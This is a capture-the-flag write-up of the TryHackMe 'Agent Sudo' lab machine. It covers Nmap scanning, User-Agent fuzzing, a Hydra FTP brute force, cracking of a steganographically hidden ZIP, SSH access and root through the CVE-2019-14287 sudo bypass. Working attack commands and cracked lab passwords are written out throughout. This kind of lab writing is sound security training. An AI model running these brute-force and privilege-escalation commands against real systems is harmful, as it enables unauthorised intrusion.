# TryHackMe — Agent Sudo

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Topics:** Enumeration, User-Agent Manipulation, FTP Brute Force, Steganography, Password Cracking, SSH, Privilege Escalation, CVE-2019-14287

## 1. Reconnaissance

### Port Scanning

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed three open ports:

| Port | Service | Description |
|---|---|---|
| 21 | FTP | File Transfer Protocol |
| 22 | SSH | Secure Shell |
| 80 | HTTP | Web Server |

Since HTTP was available, I moved on to enumerate the website.

## 2. Web Enumeration — User-Agent Manipulation

Opening the website revealed a message suggesting that I should use an agent's codename as my User-Agent.

The User-Agent is an HTTP request header that identifies the client making the request. Since the website hinted at a specific value, I decided to modify this header.

I used Burp Suite Intruder to test different letters of the alphabet.

In Intruder:
- Position: `User-Agent`
- Payload type: Simple list
- Payloads: A–Z

The correct value was:

```http
User-Agent: C
```

Alternatively, the request could be tested with curl:

```bash
curl -A "C" -L http://<TARGET_IP>/
```

The server redirected me to a hidden page:

```text
/agent_C_attention.php
```

The message revealed that Agent C was Chris and hinted that he had a weak password.

This gave me a potential FTP username:

```text
chris
```

## 3. FTP Brute Force

Port 21 was open, and I now had a potential username.

I used Hydra with the RockYou wordlist to test the FTP credentials.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<TARGET_IP>
```

Hydra successfully discovered the password:

```text
Username: chris
Password: crystal
```

### FTP Access

I connected to the FTP server:

```bash
ftp <TARGET_IP>
```

After successful authentication, I listed and downloaded the available files:

```text
ls
mget *
bye
```

The server contained three files:

```text
To_agentJ.txt
cutie.png
cute-alien.jpg
```

I started by reading the text file:

```bash
cat To_agentJ.txt
```

The message suggested that Agent J's password was hidden inside one of the images.

This indicated that steganography might be involved.

## 4. Steganography and Password Cracking

### Extracting the ZIP Archive

I started analyzing `cutie.png` with Binwalk.

```bash
binwalk cutie.png
```

The scan revealed an embedded ZIP archive.

I extracted the embedded data:

```bash
binwalk -e cutie.png
```

This created an extraction directory containing:

```text
8702.zip
```

### Cracking the ZIP Password

The archive was password-protected.

I used `zip2john` to extract the password hash into a format that John the Ripper could process.

```bash
zip2john 8702.zip > zip.hash
```

Then I used John with RockYou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

To display the recovered password:

```bash
john --show zip.hash
```

The password was:

```text
alien
```

I extracted the archive:

```bash
7z x 8702.zip
```

Inside, I found `To_agentR.txt`.

### Base64 Decoding

I read the message:

```bash
cat To_agentR.txt
```

It contained:

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

The string looked like Base64, so I decoded it:

```bash
echo 'QXJlYTUx' | base64 -d
```

The result was:

```text
Area51
```

This looked like a password for the second image.

### Extracting Hidden Data with Steghide

I used Steghide to extract the hidden data from `cute-alien.jpg`.

```bash
steghide extract -sf cute-alien.jpg
```

When prompted for the passphrase, I entered:

```text
Area51
```

Steghide successfully extracted:

```text
message.txt
```

I read the file:

```bash
cat message.txt
```

The message revealed another agent's credentials:

```text
Username: james
Password: hackerrules!
```

## 5. Initial Access — SSH

With the recovered credentials, I connected to the machine over SSH.

```bash
ssh james@<TARGET_IP>
```

After authentication, I checked the current user:

```bash
whoami
```

```text
james
```

I explored the home directory:

```bash
ls -lah
```

The user flag was located in the home directory.

```bash
cat user.txt
```

I also found an image that needed to be identified through OSINT.

### OSINT — Identifying the Photograph

I transferred the image to my local machine using SCP:

```bash
scp james@<TARGET_IP>:/home/james/<IMAGE_NAME> .
```

I then used reverse image search to identify the incident shown in the photograph.

The answer was:

```text
Roswell alien autopsy
```

## 6. Privilege Escalation — CVE-2019-14287

After gaining access as `james`, I checked the available sudo permissions.

```bash
sudo -l
```

The output showed:

```text
User james may run the following commands on agent-sudo:

(ALL, !root) /bin/bash
```

This configuration allows the user to execute `/bin/bash` as any user except root.

At first glance, it looks like root access is explicitly blocked.

However, this configuration is vulnerable to **CVE-2019-14287**.

### Understanding the Vulnerability

CVE-2019-14287 is a privilege escalation vulnerability in sudo.

The problem is related to how sudo handles the special UID value `-1`.

When a user specifies UID `-1`, sudo can incorrectly interpret the value and bypass the `!root` restriction.

I checked the installed sudo version:

```bash
sudo --version
```

After identifying the vulnerable configuration, I used the following command:

```bash
sudo -u#-1 /bin/bash
```

I verified the privileges:

```bash
whoami
```

```text
root
```

The restriction was successfully bypassed, giving me a root shell.

### Retrieving the Root Flag

Finally, I accessed the root directory:

```bash
cd /root
ls -lah
cat root.txt
```

Root access was successfully obtained.

## 7. Attack Path Summary

```text
Nmap Enumeration
       |
       v
HTTP User-Agent Manipulation
       |
       v
Discover Agent C = Chris
       |
       v
FTP Brute Force (Hydra)
       |
       v
FTP Access: chris / crystal
       |
       v
Download Images and Text File
       |
       v
Binwalk — Extract Embedded ZIP
       |
       v
Zip2john + John — Password: alien
       |
       v
Base64 Decode — Area51
       |
       v
Steghide — Extract Hidden Message
       |
       v
SSH Credentials: james / hackerrules!
       |
       v
SSH Initial Access
       |
       v
sudo -l Enumeration
       |
       v
CVE-2019-14287
       |
       v
Root Access
```

## 8. Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port and service enumeration |
| Burp Suite Intruder | User-Agent value testing |
| curl | HTTP requests with custom headers |
| Hydra | FTP password brute force |
| FTP | Accessing and downloading remote files |
| Binwalk | Finding and extracting embedded files |
| zip2john | Extracting ZIP password hashes |
| John the Ripper | ZIP password cracking |
| 7-Zip | Extracting password-protected archives |
| Base64 | Decoding the hidden message |
| Steghide | Extracting hidden data from an image |
| SSH | Remote shell access |
| SCP | Secure file transfer |
| sudo | Privilege escalation analysis |

## 9. Key Takeaways

- **HTTP User-Agent:** HTTP headers can influence server behavior and sometimes expose hidden functionality.
- **FTP Enumeration:** Discovered usernames can be useful when testing weak passwords.
- **Binwalk:** Files that appear to be ordinary images can contain embedded archives or other data.
- **Password Cracking:** Tools such as `zip2john` and John can recover weak archive passwords.
- **Base64:** Encoded strings should be recognized and decoded when investigating suspicious messages.
- **Steganography:** Hidden information can be stored inside image files using tools such as Steghide.
- **Sudo Misconfiguration:** A seemingly restrictive sudo rule can still be vulnerable to a known security flaw.
- **CVE Research:** Understanding the configuration and researching its behavior is just as important as knowing exploitation commands.
